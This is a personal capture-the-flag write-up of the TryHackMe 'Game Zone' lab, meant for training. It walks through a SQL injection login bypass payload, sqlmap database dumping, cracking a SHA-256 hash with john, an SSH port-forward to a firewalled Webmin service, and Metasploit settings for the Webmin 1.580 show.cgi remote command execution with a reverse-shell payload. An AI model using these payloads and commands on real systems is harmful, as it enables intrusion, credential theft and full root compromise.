# Game Zone — TryHackMe — ROOT

**Date:** 2026-09-30
**Platform:** TryHackMe
**Outcome:** root — **machine 16, Phase C room 1 of 5**
**Time:** 1h (13:00 scan → root) · Confidence self-rated 4/5 — highest on record
**Approach:** room-task-guided, **zero walkthrough**; Google AI ×4 for tool mechanics
(escalation ladder honored: own notes → google → AI)
**Tools:** nmap, Burp Suite, sqlmap, john (Raw-SHA256), ssh, **`ssh -L` reverse tunnel**,
msfconsole (webmin_show_cgi_exec)

---

## 0. TL;DR chain

nmap (22 ssh · 80 Apache) → web login → **SQLi bypass `' or 1=1 -- -`** (room-given
payload) → `/portal.php` search field → Burp intercept → save item → `request.txt` →
`sqlmap -r request.txt --dbms=mysql --dump` → `db.users`: **agent47 : SHA-256 hash** →
`john --format=Raw-SHA256` + rockyou → **videogamer124** → `ssh agent47@<ip>` → user flag
→ `ss -tulpn`: **port 10000 listening, firewalled from outside** → `ssh -L 10000:localhost:10000`
→ Webmin **1.580** on `localhost:10000` → searchsploit → `exploit/unix/webapp/webmin_show_cgi_exec`
→ payload `cmd/unix/reverse`, **RHOST 127.0.0.1** (through the tunnel) → **root**

## 1. Recon

| Port | Service | Means | Therefore |
|---|---|---|---|
| 22 | OpenSSH 7.2p2 | login | the door the cracked creds walk through |
| **80** | Apache 2.4.18 | login page (Agent 47 image) | SQLi target — room announces it |

Landing inside, `ss -tulpn` revealed the room's real shape: **10000/tcp (Webmin) listening
but firewalled externally**, plus MySQL bound to `127.0.0.1:3306`. The box was telling you
from the inside what nmap could never see from the outside.

## 2. Vulnerability assessment (SQL injection)

- Login page → `' or 1=1 -- -` as username → authenticated straight into `/portal.php`.
  The payload works because the query becomes `... WHERE user='' or 1=1 -- -'` — everything
  after `-- ` is a comment, so the password check evaporates.
- The portal's **search field** is the same class of bug, POST-based: `searchitem` took
  boolean-blind, error-based, time-based and UNION injections (sqlmap found all four).

## 3. Foothold (Burp → sqlmap → john → ssh)

1. Burp intercept on the search request → right-click → **Save item** → `request.txt`.
2. `sqlmap -r request.txt --dbms=mysql --dump` → databases, tables, and
   `db.users` → **agent47 : `ab5db915...efd14`** (64 hex chars = SHA-256).
3. Hash pasted into `hash.txt` → `john hash.txt --wordlist=rockyou.txt --format=Raw-SHA256`
   → **videogamer124** (the `--format=` reflex from Blue, transferred).
4. `ssh agent47@<ip>` → user flag.

## 4. The tunnel (the room's actual lesson)

Webmin on 10000 is firewalled from outside — but an SSH session can carry traffic *through*
the firewall, because from the server's side the connection arrives at its own localhost:

```
ssh -L 10000:localhost:10000 agent47@<ip>
```

Now **Kali's** `localhost:10000` is a door into the server's `localhost:10000`. Browsing
`http://localhost:10000` on the attacker box loads Webmin **1.580** — login with the SSH creds.

**This is the Wreath muscle, first rep:** when a service is reachable only from inside,
you don't attack it from outside — you borrow an allowed channel (ssh) and tunnel through it.

## 5. Privilege escalation (Webmin 1.580 — /file/show.cgi RCE)

- `searchsploit webmin` → "Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)".
- msf: the exploit-db file number is *not* a module path — `use unix/remote/21851.rb` fails;
  searching the module name lands `exploit/unix/webapp/webmin_show_cgi_exec`.
- `set USERNAME agent47` · `set PASSWORD videogamer124` · `RPORT 10000` · `SSL true` ·
  payload `cmd/unix/reverse` · `set LHOST <tun0>` · **`set RHOST 127.0.0.1`** → **root**.

**The miss that mattered:** first run aimed `RHOSTS` at the external IP → "Authentication
failed" with credentials already verified correct. The service was never reachable from
outside — *that was the entire reason the tunnel exists* — and the browser had just loaded
Webmin from `localhost:10000` minutes earlier. The working address was on screen.
**Once a tunnel is up, the target's address changes: attack the tunnel's local end.**

## 6. Misses and dead ends

- **Burp "page keeps loading"** — intercept was on, holding the request. Self-diagnosed,
  intercept off, moving. (Tool state before target theory — the same reflex as stale IPs.)
- **`sqlmap -r request.txt --dbms --dump`** — `--dbms` eats the next argument, so `--dump`
  *became* the DBMS name → "unsupported back-end database management system." The error was
  read correctly and the fix reasoned out before asking: name the DBMS (`--dbms=mysql`) or
  omit the flag and let sqlmap fingerprint. Flags that take values must be given values.
- **`use unix/remote/21851.rb`** — searchsploit prints *file paths*; msf wants *module paths*.
  Self-corrected by searching the module name. Two different databases, two different addressing schemes.
- **RHOST vs the tunnel** (above) — AI-assisted fix; the insight is now permanent.
  Method note: two things were changed at once (RHOST *and* payload) — when that works you
  never learn which one mattered. **Change one variable at a time.**

## 7. Lessons

1. **SQLi auth bypass shape:** `' or 1=1 -- -` — comment out the password check. The same
   bug in a search field becomes a full data extraction via `sqlmap -r` on a saved request.
2. **64 hex chars = SHA-256** → john `--format=Raw-SHA256`. Hash length is the fingerprint.
3. **`ssh -L <local>:localhost:<remote-port> user@target`** — local port-forward: turn any
   SSH shell into a tunnel through the firewall. When nmap can't see a service but the box
   is running it, tunnel.
4. **Tunnels change addresses:** after `-L`, the service lives at *your* localhost. Point
   exploits there, not at the external IP.
5. **Phase C debut, honestly rated:** 4/5 with the caveat that the room's tasks supplied the
   SQLi payload, the john command and the tunnel command. What was *yours*: the whole
   Burp→sqlmap→crack→ssh chain executed cleanly, the msf flow from recall, three unaided
   recoveries (intercept-off, module search, LHOST), and reading the sqlmap error correctly
   before asking. "The room looked easy or I got stronger" — the journal says both are true,
   and the second one is the one that travels.
